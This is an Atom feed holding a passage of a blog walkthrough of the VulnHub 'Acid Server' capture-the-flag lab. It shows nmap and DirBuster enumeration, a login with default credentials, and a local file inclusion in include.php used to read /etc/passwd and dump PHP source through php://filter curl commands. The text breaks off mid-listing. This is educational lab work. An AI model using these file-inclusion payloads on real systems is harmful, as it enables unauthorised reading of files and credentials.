<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Andrew Emil's blog]]></title>
  <link href="http://andrewemil.github.io/atom.xml" rel="self"/>
  <link href="http://andrewemil.github.io/"/>
  <updated>2015-08-31T00:29:36-04:00</updated>
  <id>http://andrewemil.github.io/</id>
  <author>
    <name><![CDATA[Andrew Emil]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Acid Server:1 Walkthrough]]></title>
    <link href="http://andrewemil.github.io/blog/2015/08/24/acid-server-1-walkthrough/"/>
    <updated>2015-08-24T17:16:43-04:00</updated>
    <id>http://andrewemil.github.io/blog/2015/08/24/acid-server-1-walkthrough</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/acid-server-1,125/">Acid Server</a> is a boot2root challenge built by <a href="https://twitter.com/@m_avinash143">@m_avinash143</a>
and hosted by <a href="https://www.vulnhub.com/entry/acid-server-1,125/">vulnhub</a>.
The challenge is completely focused on web exploitation and the end goal is to escalate the privileges to root and capture the flag.</p>

<p>This walkthrough shows how I solved the challenge, so lets get started.</p>

<p>After booting Acid Server and Kali Linux on virtual box (Bridged Adapter), I used netdiscover to find the ip address of Acid server:</p>

<figure class='code'><figcaption><span>Netdiscover</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# netdiscover -i eth0 -r 192.168.2.0/24
</span><span class='line'>
</span><span class='line'>Currently scanning: Finished!   <span class="p">|</span>   Screen View: Unique Hosts
</span><span class='line'>
</span><span class='line'> <span class="m">3</span> Captured ARP Req/Rep packets, from <span class="m">3</span> hosts.   Total size: <span class="m">180</span>
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address      Count  Len   MAC Vendor
</span><span class='line'> -----------------------------------------------------------------------------
</span><span class='line'> 192.168.2.1     80:1f:02:fa:e0:68    <span class="m">01</span>    <span class="m">060</span>   Unknown vendor
</span><span class='line'> 192.168.2.101   60:36:dd:a2:0c:56    <span class="m">01</span>    <span class="m">060</span>   Unknown vendor
</span><span class='line'> 192.168.2.102   08:00:27:ab:54:a5    <span class="m">01</span>    <span class="m">060</span>   CADMUS COMPUTER SYSTEMS
</span></code></pre></td></tr></table></div></figure>


<p>So, Acid&rsquo;s ip address is 192.168.2.102 and our kali&rsquo;s ip address is 192.168.2.108 as shown below:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 08:00:27:4b:6e:05
</span><span class='line'>          inet addr:192.168.2.108  Bcast:192.168.2.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::a00:27ff:fe4b:6e05/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:16990 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:18055 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:14682497 <span class="o">(</span>14.0 MiB<span class="o">)</span>  TX bytes:2634672 <span class="o">(</span>2.5 MiB<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>lo        Link encap:Local Loopback
</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span><span class='line'>          RX packets:560 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:560 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:0
</span><span class='line'>          RX bytes:4029744 <span class="o">(</span>3.8 MiB<span class="o">)</span>  TX bytes:4029744 <span class="o">(</span>3.8 MiB<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Enumeration</h3>

<p>Lets find what services are running on Acid using nmap:</p>

<figure class='code'><figcaption><span>Nmap Scan</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sS -p- -A -T5 192.168.2.102
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2015-08-23 12:14 EDT
</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.2.102
</span><span class='line'>Host is up <span class="o">(</span>0.00053s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">65534</span> closed ports
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span>_http-title: /Challenge
</span><span class='line'>MAC Address: 08:00:27:AB:54:A5 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.11 - 3.14
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'><span class="m">1</span>   0.53 ms 192.168.2.102
</span><span class='line'>
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 17.97 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Nmap found that apache web server is running on port 33447, so lets visit the main page for the web service <a href="http://192.168.2.102:33447/">http://192.168.2.102:33447/</a></p>

<p><img class="center" src="http://andrewemil.github.io/images/2015/1/image 1.png"></p>

<p>My next destination was DirBuster to find hidden directories or files that might be interesting:</p>

<p><img class="center" src="http://andrewemil.github.io/images/2015/1/image 2.png">
<em>Note: I used directory-list-2.3-medium.txt wordlist which is located in /usr/share/dirbuster/wordlists/</em></p>

<p>So, DirBuster has found the &ldquo;/Challenge&rdquo; directory, and the index page of this directory is a login form as we can see:</p>

<p><img class="center" src="http://andrewemil.github.io/images/2015/1/image 3.png"></p>

<p>Lets view the page source to see if we can identify the script behind this login form:</p>

<p><img class="center" src="http://andrewemil.github.io/images/2015/1/image 4.png"></p>

<p>And examining form.js script as well:</p>

<figure class='code'><figcaption><span>form.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/* * Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2013</span> peredur.net * * This program is free software: you can redistribute it and/or modify * it under the terms of the
</span><span class='line'> GNU General Public License as published by * the Free Software Foundation, either version <span class="m">3</span> of the License, or * <span class="o">(</span>at your option<span class="o">)</span> any later version. * * This program is distributed in the hope that it will be useful,
</span><span class='line'>* but WITHOUT ANY WARRANTY<span class="p">;</span> without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the * GNU General Public License <span class="k">for</span> more details.
</span><span class='line'> * * You should have received a copy of the GNU General Public License * along with this program. If not, see &lt;http://www.gnu.org/licenses/&gt;. */
</span></code></pre></td></tr></table></div></figure>


<p>After searching for the login script in google using keywords &ldquo;secure login peredur.net&rdquo;, I found its main <a href="https://github.com/peredurabefrog/phpSecureLogin">github repository</a> and the default dabtabase
is configured with a default user &ldquo;test_user&rdquo; as we can see in the description of the github repo, so lets try to login using these credentials:</p>

<figure class='code'><figcaption><span>snippet from phpsecurelogin repo</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>The code to create and populate the necessary tables is included in the <span class="s1">&#39;secure_login.sql&#39;</span> file. It populates the members table with a single user with the following details:
</span><span class='line'>
</span><span class='line'>Username : test_user Email : <span class="nb">test</span>@example.com Password : 6ZaxN2Vzm9NUJT2y
</span></code></pre></td></tr></table></div></figure>


<p>After logging into the admin panel using the test_user credentials, there is a sec_session_id cookie assigned after a successful login which I will use later when I continue exploitation using the cURL utility.</p>

<p>After we login,  we are directed to <a href="http://192.168.2.102:33447/Challenge/protected_page.php">http://192.168.2.102:33447/Challenge/protected_page.php</a> :</p>

<p><img class="center" src="http://andrewemil.github.io/images/2015/1/image 5.png"></p>

<p>And we can see the assigned session cookie using <a href="https://addons.mozilla.org/ar/firefox/addon/live-http-headers/">Live Http Headers</a> firefox add-on:</p>

<p>Set-Cookie: sec_session_id=64uk8pthsvr3939mm9joa5u254; path=/; HttpOnly</p>

<p><img class="center" src="http://andrewemil.github.io/images/2015/1/image 6.png"></p>

<p>The &ldquo;Click Here to Proceed Further&rdquo; link direct us to <a href="http://192.168.2.102:33447/Challenge/include.php,">http://192.168.2.102:33447/Challenge/include.php,</a> which is a php script that allows us to include any readable file by the apache&rsquo;s user in the system.</p>

<p>In another words we have Local File Inclusion vulnerability in our hands, I also tried to include remote files but it didn&rsquo;t work.</p>

<p><img class="center" src="http://andrewemil.github.io/images/2015/1/image 7.png"></p>

<p>Lets try to read the /etc/passwd file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span>%2Fetc%2Fpasswd<span class="p">&amp;</span><span class="nv">add</span><span class="o">=</span>Extract+File
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://andrewemil.github.io/images/2015/1/image 8.png"></p>

<p>So, This is an absolute path LFI.</p>

<p>At this point, I tried to get RCE using the LFI vulnerability by using apache log poisoning method, reading /proc/self/environ, or any logs in the apache&rsquo;s file descriptors,
but it seems that the apache user doesn&rsquo;t have any read access on those files and only <strong>php://filter</strong> meta-wrapper worked which is very useful for further enumeration of any readable files in the target system.</p>

<p><em>php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening, and forces PHP to base64 encode the file before it is used in the include statement, so we can examine its source code.</em></p>

<p><em>There is only one readable file descriptor /proc/self/fd/14 which I found using BurbSuit(Intruder attack combined with Numbers payload) and by brutefocing the file descriptor number utilizing the include.php script, but I found later after enumerating the files in the web server that this file descriptor only contains php session variables which aren&rsquo;t controlable by any mean, so it was useless.</em></p>

<p><img class="center" src="http://andrewemil.github.io/images/2015/1/image 9.png"></p>

<h3>Files Enumeration using PHP://filter</h3>

<p>Lets go to the next step and start enumerating the underlying files in the current directory, and we will start by <em>include.php</em>:</p>

<figure class='code'><figcaption><span>bas64 of include.php source code</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=pdn8qkd0v8ukgpdpcip10n00b5&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;php://filter/convert.base64-encode/resource=include.php&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f 1
</span><span class='line'>
</span><span class='line'>PD9waHAKaW5jbHVkZV9vbmNlICdpbmNsdWRlcy9kYl9jb25uZWN0LnBocCc7CmluY2x1ZGVfb25jZSAnaW5jbHVkZXMvZnVuY3Rpb25zLnBocCc7CgpzZWNfc2Vzc2lvbl9zdGF
</span><span class='line'>ydCgpOwokX1NFU1NJT05bJ2xvbCddPXRpbWUoKTsKCmlmICghaXNzZXQoJF9TRVNTSU9OWydwcm90ZWN0ZWRfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogcH
</span><span class='line'>JvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnaW5kZXhfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogc
</span><span class='line'>HJvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQo/PgoKPD9waHAgCiRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsKaW5jbHVkZSgkZmlsZSk7Cj8+CjwhRE9DVFlQRSBo
</span><span class='line'>dG1sPgo8aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICAgICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgICAgICAgICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGV
</span><span class='line'>ldCIgaHJlZj0iY3NzL3N0eWxlLmNzcyI+CiAgICAgICAgICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlcy9tYWluLmNzcyIgLz4KICAgICAgICAgIC
</span><span class='line'>AgICAgIDx0aXRsZT5UcnkgdG8gRXh0cmFjdCBKdWljeSBkZXRhaWxzPC90aXRsZT4KICAgICAgICA8L2hlYWQ+CiAgICAgICAgPGJvZHk+CiAgICAgICAgICAgICAgICA8ZGl2I
</span><span class='line'>GNsYXNzPSJ3cmFwcGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJCTxwPiA8aDE+SG1tLi4uSXQgbG9va3MgbGlrZSB0aGF0
</span><span class='line'>IHlvdSBrbm93IHlvdXIgdGhpbmdzPC9oMT4gPGJyPiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9ImdldCIgYWN0aW9uPSI8P3BocCAkX1B
</span><span class='line'>IUF9TRUxGID8+Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbnRlciB0aGUgRmlsZSBuYW1lOjxpbnB1dCBuYW1lPSJmaWxlIiBwbGFjZWhvbGRlcj0iRmlsZS
</span><span class='line'>BOYW1lIiB0eXBlPSJ0ZXh0IiBpZD0iaWQiIG1heGxlbmd0aD0iMjAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJhZGQiIHR5cGU9InN1Y
</span><span class='line'>m1pdCIgaWQ9ImFkZCIgdmFsdWU9IkV4dHJhY3QgRmlsZSI+CiAgPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoK
</span><span class='line'><span class="nv">CjwhLS0weDU5MzM1NjZhNGM2ZTRhMzQ2MjZlNDEzZC0tPgo</span><span class="o">=</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>Note: In the cURL command, I used urlencode() function in php to send urlencoded input in the &ldquo;file&rdquo; GET variable. I also used sed and cut commands to get rid of the html code in the output</em>.</p>

<p>After decoding the base64 of the include.php source code, nothing useful was found except that we can see how our files are included in the script using <em>include($file);</em>:</p>

<figure class='code'><figcaption><span>include.php source code</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="nb">echo </span>PD9waHAKaW5jbHVkZV9vbmNlICdpbmNsdWRlcy9kYl9jb25uZWN0LnBocCc7CmluY2x1ZGVfb25jZSAnaW5jbHVkZXMvZnVuY3Rpb25zLnBocCc7CgpzZ
</span><span class='line'>WNfc2Vzc2lvbl9zdGFydCgpOwokX1NFU1NJT05bJ2xvbCddPXRpbWUoKTsKCmlmICghaXNzZXQoJF9TRVNTSU9OWydwcm90ZWN0ZWRfcGFnZSddKSl7CiAgICAgICAgaGVhZGVy
</span><span class='line'>KCdMb2NhdGlvbjogcHJvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnaW5kZXhfcGFnZSddKSl7CiAgICAgICAgaGVhZGV
</span><span class='line'>yKCdMb2NhdGlvbjogcHJvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQo/PgoKPD9waHAgCiRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsKaW5jbHVkZSgkZmlsZSk7Cj
</span><span class='line'>8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICAgICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgICAgICAgICAgICAgIDxsaW5rI
</span><span class='line'>HJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL3N0eWxlLmNzcyI+CiAgICAgICAgICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlcy9tYWluLmNzcyIg
</span><span class='line'>Lz4KICAgICAgICAgICAgICAgIDx0aXRsZT5UcnkgdG8gRXh0cmFjdCBKdWljeSBkZXRhaWxzPC90aXRsZT4KICAgICAgICA8L2hlYWQ+CiAgICAgICAgPGJvZHk+CiAgICAgICA
</span><span class='line'>gICAgICAgICA8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJCTxwPiA8aDE+SG1tLi4uSXQgbG
</span><span class='line'>9va3MgbGlrZSB0aGF0IHlvdSBrbm93IHlvdXIgdGhpbmdzPC9oMT4gPGJyPiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9ImdldCIgYWN0a
</span><span class='line'>W9uPSI8P3BocCAkX1BIUF9TRUxGID8+Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbnRlciB0aGUgRmlsZSBuYW1lOjxpbnB1dCBuYW1lPSJmaWxlIiBwbGFj
</span><span class='line'>ZWhvbGRlcj0iRmlsZSBOYW1lIiB0eXBlPSJ0ZXh0IiBpZD0iaWQiIG1heGxlbmd0aD0iMjAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJ
</span><span class='line'>hZGQiIHR5cGU9InN1Ym1pdCIgaWQ9ImFkZCIgdmFsdWU9IkV4dHJhY3QgRmlsZSI+CiAgPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCg
</span><span class='line'><span class="nv">oKCgoKCgoKCgoKCgoKCjwhLS0weDU5MzM1NjZhNGM2ZTRhMzQ2MjZlNDEzZC0tPgo</span><span class="o">=</span> <span class="p">|</span> base64 --decode
</span><span class='line'>&lt;?php
</span><span class='line'>include_once <span class="s1">&#39;includes/db_connect.php&#39;</span><span class="p">;</span>
</span><span class='line'>include_once <span class="s1">&#39;includes/functions.php&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>sec_session_start<span class="o">()</span><span class="p">;</span>
</span><span class='line'><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;lol&#39;</span><span class="o">]=</span><span class="nb">time</span><span class="o">()</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;protected_page&#39;</span><span class="o">])){</span>
</span><span class='line'>        header<span class="o">(</span><span class="s1">&#39;Location: protected_page.php&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>        <span class="nb">exit</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;index_page&#39;</span><span class="o">])){</span>
</span><span class='line'>        header<span class="o">(</span><span class="s1">&#39;Location: protected_page.php&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>        <span class="nb">exit</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>?&gt;
</span><span class='line'>
</span><span class='line'>&lt;?php
</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'>include<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>?&gt;
</span><span class='line'>&lt;!DOCTYPE html&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>        &lt;head&gt;
</span><span class='line'>                &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
</span><span class='line'>                &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;css/style.css&quot;</span>&gt;
</span><span class='line'>                &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;styles/main.css&quot;</span> /&gt;
</span><span class='line'>                &lt;title&gt;Try to Extract Juicy details&lt;/title&gt;
</span><span class='line'>        &lt;/head&gt;
</span><span class='line'>        &lt;body&gt;
</span><span class='line'>                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;wrapper&quot;</span>&gt;
</span><span class='line'>                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
</span><span class='line'>              &lt;p&gt; &lt;h1&gt;Hmm...It looks like that you know your things&lt;/h1&gt; &lt;br&gt;
</span><span class='line'>                                &lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;get&quot;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;&lt;?php $_PHP_SELF ?&gt;&quot;</span>&gt;
</span><span class='line'>                                Enter the File name:&lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;file&quot;</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;File Name&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;id&quot;</span> <span class="nv">maxlength</span><span class="o">=</span><span class="s2">&quot;20&quot;</span>&gt;
</span><span class='line'>                                &lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;add&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;add&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Extract File&quot;</span>&gt;
</span><span class='line'>  &lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Lets proceed with examining the source code of the <em>protected_page.php</em> scirpt:</p>

<figure class='code'><figcaption><span>protected_page.php source code </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=pdn8qkd0v8ukgpdpcip10n00b5&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;php://filter/convert.base64-encode/resource=protected_page.php&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f <span class="m">1</span> <span class="p">|</span> base64 --decode
</span><span class='line'>&lt;?php
</span><span class='line'>include_once <span class="s1">&#39;includes/db_connect.php&#39;</span><span class="p">;</span>
</span><span class='line'>include_once <span class="s1">&#39;includes/functions.php&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>sec_session_start<span class="o">()</span><span class="p">;</span>
</span><span class='line'><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;protected_page&#39;</span><span class="o">]=</span><span class="nb">time</span><span class="o">()</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>?&gt;
</span><span class='line'>
</span><span class='line'>&lt;!DOCTYPE html&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>    &lt;head&gt;
</span><span class='line'>        &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
</span><span class='line'>      &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;css/style.css&quot;</span>&gt;
